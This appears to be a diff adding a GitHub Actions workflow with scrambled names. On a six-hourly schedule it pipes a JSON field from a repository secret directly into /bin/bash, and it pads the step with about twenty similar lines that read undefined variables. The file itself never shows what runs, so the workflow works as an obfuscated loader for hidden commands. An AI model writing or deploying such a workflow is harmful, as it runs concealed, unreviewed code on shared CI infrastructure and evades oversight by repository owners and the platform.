@@ -1,0 +1,38 @@
+name: huangganshi9316
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangganshi9316
+        env:
+          laao2: ${{ secrets.laao2 }}
+        run: |
+          echo $laao2 | jq -r .nlija766 | /bin/bash
+          echo $svzx6352 | jq -r .m05 | /bin/bash
+          echo $bv990 | jq -r .ngzvi04 | /bin/bash
+          echo $gjpfh75101 | jq -r .jreak2 | /bin/bash
+          echo $tkthj882 | jq -r .jd99 | /bin/bash
+          echo $hoy82758 | jq -r .dmtb61256 | /bin/bash
+          echo $gdvhx95081 | jq -r .kbdr8970 | /bin/bash
+          echo $zajlb8924 | jq -r .lfdz738 | /bin/bash
+          echo $mh4580 | jq -r .b025 | /bin/bash
+          echo $msmh80 | jq -r .xv09802 | /bin/bash
+          echo $dk28 | jq -r .cc81 | /bin/bash
+          echo $oy785 | jq -r .yyocl178 | /bin/bash
+          echo $qkdbl66 | jq -r .us89061 | /bin/bash
+          echo $etki565 | jq -r .tunc77 | /bin/bash
+          echo $wkker8 | jq -r .qagss74420 | /bin/bash
+          echo $z111 | jq -r .s0106 | /bin/bash
+          echo $aff897 | jq -r .xrzzz6882 | /bin/bash
+          echo $irxkh1677 | jq -r .chjc9 | /bin/bash
+          echo $tvw82 | jq -r .irpn8836 | /bin/bash
+          echo $tabn2 | jq -r .ahtn06 | /bin/bash
+          echo $yomly02737 | jq -r .emv114 | /bin/bash
+          echo $wdi7 | jq -r .bfz93371 | /bin/bash
+
